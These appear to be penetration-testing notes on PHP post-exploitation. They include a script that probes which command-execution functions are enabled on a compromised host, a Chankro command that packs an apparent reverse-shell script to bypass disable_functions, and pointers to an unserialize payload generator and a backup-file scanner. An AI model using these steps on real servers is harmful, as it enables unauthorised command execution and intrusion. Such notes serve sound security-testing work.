# PHP

## RCE Function Check

If you can execute PHP on a target but want to figure out which functions are available to you to execute commands on the host, you can use this script.

Link to gist: [https://gist.github.com/AppSecExplained/aab510eead65c9c95aa20a69d89c9d2a](https://gist.github.com/AppSecExplained/aab510eead65c9c95aa20a69d89c9d2a)

```shellscript
<?php

$test_command = 'echo "time for some fun!"';
$functions_to_test = [
    'system',
    'shell_exec',
    'exec',
    'passthru',
    'popen',
    'proc_open',
];

function test_function($func_name, $test_command) {
    if (function_exists($func_name)) {
        try {
            $output = @$func_name($test_command);
            if ($output) {
                echo "Function '{$func_name}' enabled and executed the test command.\n";
            } else {
                echo "Function '{$func_name}' enabled, but failed to execute the test command.\n";
            }
        } catch (Throwable $e) {
            echo "Function '{$func_name}' enabled, but an error occurred: {$e->getMessage()}\n";
        }
    } else {
        echo "Function '{$func_name}' disabled or not available.\n";
    }
}

foreach ($functions_to_test as $func) {
    test_function($func, $test_command);
} ?>
```

*

{% embed url="https://github.com/TarlogicSecurity/Chankro" %}

*   Bypass disable\_functions and open\_basedir

    ```bash
    python2 chankro.py --arch 64 --input rev.sh --output chan.php --path /var/www/html
    ```
* Unserialize PHP Payload generator\
  https://github.com/ambionics/phpggc
* Backup Artifacts<br>

{% embed url="https://github.com/mazen160/bfac" %}

```bash
bfac --url http://example.com/test.php
```
